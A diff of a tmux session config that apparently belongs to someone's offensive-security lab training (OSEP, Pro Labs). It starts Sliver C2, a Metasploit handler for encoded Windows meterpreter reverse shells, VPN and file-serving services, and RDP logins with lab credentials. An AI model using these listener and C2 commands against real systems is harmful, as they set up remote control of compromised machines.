@@ -54,15 +54,28 @@ windows:
       # 'before' represents legacy functionality and will be deprecated in a future release, in favour of 'after'
       # synchronize: after
       panes:
-        - sudo openvpn ../client.ovpn
-        - sudo python3 -m http.server 80
-        - sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set lhost 192.168.49.63;set lport 443;set exitfunc thread;set EnableStageEncoding true;set StageEncoder x64/xor_dynamic;run -j -z"
-        - sudo systemctl start smbd && sudo systemctl start smbd
+        - sudo systemctl start smbd && sudo systemctl start nmbd && sudo service ssh start && sudo systemctl start sliver && sliver
+          #- sudo python3 -m http.server 80
+        - sudo service apache2 restart && sudo tail -f /var/log/apache2/access.log
+        - sudo msfconsole -q -x "set AutoRunScript multi_console_command -r /home/kali/Desktop/osep/autoruncommands.rc;use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 10.10.14.146;set lport 8443;set exitfunc thread;set EnableStageEncoding true;set StageEncoder x64/xor_dynamic;run -j -z"
+        - sudo openvpn ../pro_labs_inlixan.ovpn
   - main:
       layout: 37ea,235x50,0,0{117x50,0,0,4,117x50,118,0,5}
       # Synchronize all panes of this window, can be enabled before or after the pane commands run.
       # 'before' represents legacy functionality and will be deprecated in a future release, in favour of 'after'
       # synchronize: after
       panes:
-        - rdesktop 192.168.63.11 -u Offsec -p lab
-        - rdesktop 192.168.63.12 -u Offsec -p lab
+        - rdesktop 192.168.63.11 -u Offsec -p lab -g 90%
+        - rdesktop 192.168.63.12 -u Offsec -p lab -g 90%
+  - main:
+      layout: 37ea,235x50,0,0{117x50,0,0,4,117x50,118,0,5}
+      # Synchronize all panes of this window, can be enabled before or after the pane commands run.
+      # 'before' represents legacy functionality and will be deprecated in a future release, in favour of 'after'
+      # synchronize: after
+      panes:
+        #- sudo posh-server
+        #- sudo posh-server
+        - echo test
+        - echo test
+
+
